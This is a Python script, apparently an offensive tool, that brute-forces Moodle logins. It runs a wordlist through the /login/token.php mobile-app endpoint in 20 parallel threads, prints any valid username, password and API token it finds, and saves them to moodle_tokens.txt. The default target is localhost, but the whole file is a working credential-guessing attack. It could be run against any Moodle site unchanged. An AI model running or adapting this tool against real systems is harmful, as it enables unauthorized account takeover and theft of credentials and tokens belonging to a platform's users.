#!/usr/bin/env python3
import requests
import sys
import json
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://localhost:8081"
TOKEN_ENDPOINT = f"{TARGET}/login/token.php"
SERVICE = "moodle_mobile_app"

def try_login(username, password):
    payload = {
        "username": username,
        "password": password,
        "service": SERVICE
    }
    try:
        resp = requests.post(TOKEN_ENDPOINT, data=payload, timeout=10)
        data = resp.json()
        if "token" in data:
            print(f"\n[+] SUCCESS: {username}:{password}")
            print(f"[+] Token: {data['token']}")
            with open("moodle_tokens.txt", "a") as f:
                f.write(f"{username}:{password}:{data['token']}\n")
            return True
        elif "errorcode" in data and data.get("errorcode") == "invalidlogin":
            return False
    except Exception as e:
        return False
    return False

def brute_force(username, wordlist, threads=20):
    with open(wordlist, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    print(f"[*] Starting brute force against {username}")
    print(f"[*] Wordlist size: {len(passwords)} | Threads: {threads}")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(try_login, username, pwd): pwd for pwd in passwords}
        for future in futures:
            if future.result():
                executor.shutdown(wait=False)
                return

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <username> <wordlist>")
        sys.exit(1)
    brute_force(sys.argv[1], sys.argv[2])